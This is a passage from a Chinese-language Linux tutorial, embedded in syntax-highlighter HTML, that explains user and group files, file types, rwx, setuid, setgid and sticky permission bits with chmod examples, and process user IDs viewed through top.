class=\"crayon-o\">:</span><span class=\"crayon-v\">x</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">1</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">1</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">daemon</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sbin</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">bin</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">sh</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a92874b3b8285193957-4\"><span class=\"crayon-v\">bin</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">x</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">2</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">2</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">bin</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">bin</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">bin</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">sh</span></div><div class=\"crayon-line\" id=\"crayon-5b4a92874b3b8285193957-5\"><span class=\"crayon-v\">sys</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">x</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">3</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">3</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">sys</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">dev</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">bin</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">sh</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a92874b3b8285193957-6\"><span class=\"crayon-v\">sync</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">x</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">4</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">65534</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">sync</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">bin</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">bin</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">sync</span></div><div class=\"crayon-line\" id=\"crayon-5b4a92874b3b8285193957-7\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a92874b3b8285193957-8\"><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">cat</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">etc</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">group</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-v\">head</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">n</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5</span></div><div class=\"crayon-line\" id=\"crayon-5b4a92874b3b8285193957-9\"><span class=\"crayon-v\">root</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">x</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">0</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a92874b3b8285193957-10\"><span class=\"crayon-v\">daemon</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">x</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">1</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5b4a92874b3b8285193957-11\"><span class=\"crayon-v\">bin</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">x</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">2</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a92874b3b8285193957-12\"><span class=\"crayon-v\">sys</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">x</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">3</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5b4a92874b3b8285193957-13\"><span class=\"crayon-v\">adm</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">x</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">4</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">miracle</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0030 seconds] -->\r\n<p></p>\n<h3>文件权限控制信息<a id=\"orgheadline9\"></a></h3>\n<h4>文件类型<a id=\"orgheadline5\"></a></h4>\n<p><code>Linux</code> 中的文件有如下类型：</p>\n<ul>\n<li>普通文件， 又包括文本文件和二进制文件， 可用 <code>touch</code> 创建；</li>\n<li>套接字文件， 用于网络通讯，一般由应用程序在执行中间接创建；</li>\n<li>管道文件是有名管道，而非无名管道， 可用 <code>mkfifo</code> 创建；</li>\n<li>字符文件和块文件均为设备文件， 可用 <code>mknod</code> 创建；</li>\n<li>链接文件是软链接文件，而非硬链接文件, 可用 <code>ln</code> 创建。</li>\n</ul>\n<h4>访问权限控制组<a id=\"orgheadline6\"></a></h4>\n<p>分为三组进行控制：</p>\n<ul>\n<li><code>user</code> 包含对文件属主设定的权限</li>\n<li><code>group</code> 包含对文件属组设定的权限</li>\n<li><code>others</code> 包含对其他者设定的权限</li>\n</ul>\n<h4>可设定的权限<a id=\"orgheadline7\"></a></h4>\n<p>下面给出常见（但非全部）的权限值， 包括：</p>\n<ul>\n<li><code>r</code> 表示具有读权限。</li>\n<li><code>w</code> 表示具有写权限。</li>\n<li><code>x</code> 一般针对可执行文件/目录，表示具有执行/搜索权限。</li>\n<li><code>s</code> 一般针对可执行文件/目录，表示具有赋予文件属主权限的权限，只有 <code>user</code> 和 <code>group</code> 组可以设置该权限。</li>\n<li><code>t</code> 一般针对目录，设置粘滞位后，有权限的用户只能写、删除自己的文件,否则可写、删除目录所有文件。旧系统还表示可执行文件运行后将text拷贝到交换区提升速度。</li>\n</ul>\n<h4>举例<a id=\"orgheadline8\"></a></h4>\n<p>通过 <code>ls -l</code> 可以查看到其文件类型及权限，通过 <code>chmod</code> 修改权限。</p>\n<p>举例来说，</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a92874b3c2706118949\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ ls -l /usr/bin/qemu-i386 \r\n-rwxr-xr-x 1 root root 2149080  8月 13  2014 /usr/bin/qemu-i386\r\n$ chmod 1775 test/\r\n$ ls -l |grep test\r\ndrwxrwxr-t 2 miracle video 4096  7月 20 09:31 test\r\n$ chmod 2777 test2/\r\n$ ls -l |grep test2\r\ndrwxrwsrwx 2 miracle video 4096  7月 20 09:32 test2\r\n$ chmod 4777 test3/\r\n$ ls -l |grep test3\r\ndrwsrwxrwx 2 miracle video 4096  7月 20 09:33 test3</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a92874b3c2706118949-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a92874b3c2706118949-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4a92874b3c2706118949-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a92874b3c2706118949-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4a92874b3c2706118949-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a92874b3c2706118949-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4a92874b3c2706118949-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a92874b3c2706118949-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b4a92874b3c2706118949-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a92874b3c2706118949-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b4a92874b3c2706118949-11\">11</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a92874b3c2706118949-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ls</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">l</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">bin</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">qemu</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">i386</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a92874b3c2706118949-2\"><span class=\"crayon-o\">-</span><span class=\"crayon-v\">rwxr</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">xr</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">x</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">root </span><span class=\"crayon-i\">root</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2149080</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">8</span>月<span class=\"crayon-h\"> </span><span class=\"crayon-cn\">13</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">2014</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">bin</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">qemu</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">i386</span></div><div class=\"crayon-line\" id=\"crayon-5b4a92874b3c2706118949-3\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">chmod</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1775</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">test</span><span class=\"crayon-o\">/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a92874b3c2706118949-4\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ls</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">l</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-e\">grep </span><span class=\"crayon-e\">test</span></div><div class=\"crayon-line\" id=\"crayon-5b4a92874b3c2706118949-5\"><span class=\"crayon-v\">drwxrwxr</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">t</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">miracle </span><span class=\"crayon-i\">video</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">4096</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">7</span>月<span class=\"crayon-h\"> </span><span class=\"crayon-cn\">20</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">09</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">31</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">test</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a92874b3c2706118949-6\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">chmod</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2777</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">test2</span><span class=\"crayon-o\">/</span></div><div class=\"crayon-line\" id=\"crayon-5b4a92874b3c2706118949-7\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ls</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">l</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-e\">grep </span><span class=\"crayon-e\">test2</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a92874b3c2706118949-8\"><span class=\"crayon-i\">drwxrwsrwx</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">miracle </span><span class=\"crayon-i\">video</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">4096</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">7</span>月<span class=\"crayon-h\"> </span><span class=\"crayon-cn\">20</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">09</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">32</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">test2</span></div><div class=\"crayon-line\" id=\"crayon-5b4a92874b3c2706118949-9\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">chmod</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">4777</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">test3</span><span class=\"crayon-o\">/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a92874b3c2706118949-10\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ls</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">l</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-e\">grep </span><span class=\"crayon-e\">test3</span></div><div class=\"crayon-line\" id=\"crayon-5b4a92874b3c2706118949-11\"><span class=\"crayon-i\">drwsrwxrwx</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">miracle </span><span class=\"crayon-i\">video</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">4096</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">7</span>月<span class=\"crayon-h\"> </span><span class=\"crayon-cn\">20</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">09</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">33</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">test3</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0032 seconds] -->\r\n<p>输出中， 第1个字符表示文件类型，其中，普通文件(<code>-</code>)、目录文件 (<code>d</code>)、套接字文件(<code>s</code>)，管道文件(<code>p</code>)，字符文件(<code>c</code>)，块文件(<code>b</code>)，链接文件(<code>l</code>)； 第2个字符开始的 <code>-rwxr-xr-x</code> 部分表示文件的权限位，共有9位。</p>\n<p>对于文件 <code>/usr/bin/qemu-i386</code> , 这个权限控制的含义是：</p>\n<ol>\n<li>第2~4位的 <code>rwx</code> 表示该文件可被它的 <code>owner</code> （属主）以 <code>r</code> 或 <code>w</code> 或 <code>x</code> 的权限访问。</li>\n<li>第5~7位的 <code>r-x</code> 表示该文件可被与该文件同一属组的用户以 <code>r</code> 或 <code>x</code> 的权限访问</li>\n<li>第8~10位的 <code>r-x</code> 表示该文件可被其它未知用户以 <code>r</code> 或 <code>x</code> 的权限访问。</li>\n</ol>\n<p>对于 <code>test/, test2/, test3/</code> 设定的权限：</p>\n<ol>\n<li><code>r,w,x</code> 权限对每一权限控制组的权限用一位8进制来表示； 例如： <code>755</code> 表示 <code>rwxr-xr-x</code> 。</li>\n<li><code>s,t</code> 权限会替代 <code>x</code> 位置显示；设定 <code>s,t</code> 权限则需在对应的、用于控制 <code>r,w,x</code> 的8进制权限控制组前追加数字； <code>s</code> 权限用于属主属组控制， <code>t</code> 用于其它控制。</li>\n<li>设定属主 <code>s</code> 需追加 <code>4</code>, 设定属组 <code>s</code> 追加 <code>2</code>, 设定其它者 <code>t</code> 权限追加 <code>1</code> ； 例如前面对 <code>test/</code> 设定 <code>t</code>, 则用 <code>1775</code>, 表示 <code>rwxrwxr-t</code> 。</li>\n</ol>\n<h3>进程权限控制信息<a id=\"orgheadline12\"></a></h3>\n<h4>进程权限<a id=\"orgheadline10\"></a></h4>\n<p>对于进程，有如下属性与文件访问权限相关：</p>\n<ul>\n<li><code>effective user id</code> : 进程访问文件权限相关的 <code>UID</code> （简写为 <code>euid</code> ）。</li>\n<li><code>effective group id</code> : 进程访问文件权限相关的 <code>GID</code> （简写为 <code>egid</code> ）。</li>\n<li><code>real user id</code> : 创建该进程的用户登录系统时的 <code>UID</code> （简写为 <code>ruid</code> ）。</li>\n<li><code>real group id</code> : 创建该进程的用户登录系统时的 <code>GID</code> （简写为 <code>rgid</code> ）。</li>\n<li><code>saved set user id</code> : 拷贝自 <code>euid</code> 。</li>\n<li><code>saved set group id</code> : 拷贝自 <code>egid</code> 。</li>\n</ul>\n<h4>举例<a id=\"orgheadline11\"></a></h4>\n<p>我们可以使用 <code>ps</code> 和 <code>top</code> 选择查看具有 <code>euid</code> 和 <code>ruid</code> 的进程。或者通过 <code>top</code> 来查看进程的 <code>euid</code> 和 <code>ruid</code></p>\n<p>通过 <code>top</code> 来查看的例子：</p>\n<ol>\n<li>首先输入 <code>top</code> 得到类似如下<br>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a92874b3c7576804153\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$top -d 10.10\r\ntop - 15:50:39 up 9 days,  1:42,  9 users,  load average: 0.13, 0.16, 0.21\r\nTasks: 287 total,   2 running, 284 sleeping,   0 stopped,   1 zombie\r\nCpu(s): 20.8%us,  4.6%sy,  0.0%ni, 72.5%id,  2.1%wa,  0.0%hi,  0.0%si,  0.0%st\r\nMem:   7707276k total,  7574252k used,   133024k free,   154872k buffers\r\nSwap:  1998844k total,   223744k used,  1775100k free,  3330212k cached\r\n\r\n  PID USER      PR  NI  VIRT  RES  SHR S %CPU %MEM    TIME+  COMMAND                                                                                \r\n31603 miracle   20   0 2368m 681m  52m S    6  9.1 206:07.74 firefox                                                                                \r\n 1507 root      20   0  451m 188m  97m S    2  2.5 193:49.86 Xorg  \r\n....</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a92874b3c7576804153-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a92874b3c7576804153-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4a92874b3c7576804153-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a92874b3c7576804153-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4a92874b3c7576804153-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a92874b3c7576804153-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4a92874b3c7576804153-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a92874b3c7576804153-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b4a92874b3c7576804153-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a92874b3c7576804153-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b4a92874b3c7576804153-11\">11</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a92874b3c7576804153-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">top</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">d</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">10.10</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a92874b3c7576804153-2\"><span class=\"crayon-v\">top</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">15</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">50</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">39</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">up</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">9</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">days</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">1</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">42</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">9</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">users</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\">  </span><span class=\"crayon-e\">load </span><span class=\"crayon-v\">average</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0.13</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0.16</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0.21</span></div><div class=\"crayon-line\" id=\"crayon-5b4a92874b3c7576804153-3\"><span class=\"crayon-v\">Tasks</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">287</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">total</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">2</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">running</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">284</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">sleeping</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">stopped</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">zombie</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a92874b3c7576804153-4\"><span class=\"crayon-e\">Cpu</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">s</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">20.8</span><span class=\"crayon-o\">%</span><span class=\"crayon-v\">us</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">4.6</span><span class=\"crayon-o\">%</span><span class=\"crayon-v\">sy</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">0.0</span><span class=\"crayon-o\">%</span><span class=\"crayon-v\">ni</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">72.5</span><span class=\"crayon-o\">%</span><span class=\"crayon-v\">id</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">2.1</span><span class=\"crayon-o\">%</span><span class=\"crayon-v\">wa</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">0.0</span><span class=\"crayon-o\">%</span><span class=\"crayon-v\">hi</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">0.0</span><span class=\"crayon-o\">%</span><span class=\"crayon-v\">si</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">0.0</span><span class=\"crayon-o\">%</span><span class=\"crayon-e\">st</span></div><div class=\"crayon-line\" id=\"crayon-5b4a92874b3c7576804153-5\"><span class=\"crayon-v\">Mem</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">7707276k</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">total</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">7574252k</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">used</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">133024k</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">free</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">154872k</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">buffers</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a92874b3c7576804153-6\"><span class=\"crayon-v\">Swap</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">1998844k</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">total</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">223744k</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">used</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">1775100k</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">free</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">3330212k</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">cached</span></div><div class=\"crayon-line\" id=\"crayon-5b4a92874b3c7576804153-7\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a92874b3c7576804153-8\"><span class=\"crayon-e\">  </span><span class=\"crayon-e\">PID </span><span class=\"crayon-e\">USER      </span><span class=\"crayon-e\">PR  </span><span class=\"crayon-e\">NI  </span><span class=\"crayon-e\">VIRT  </span><span class=\"crayon-e\">RES  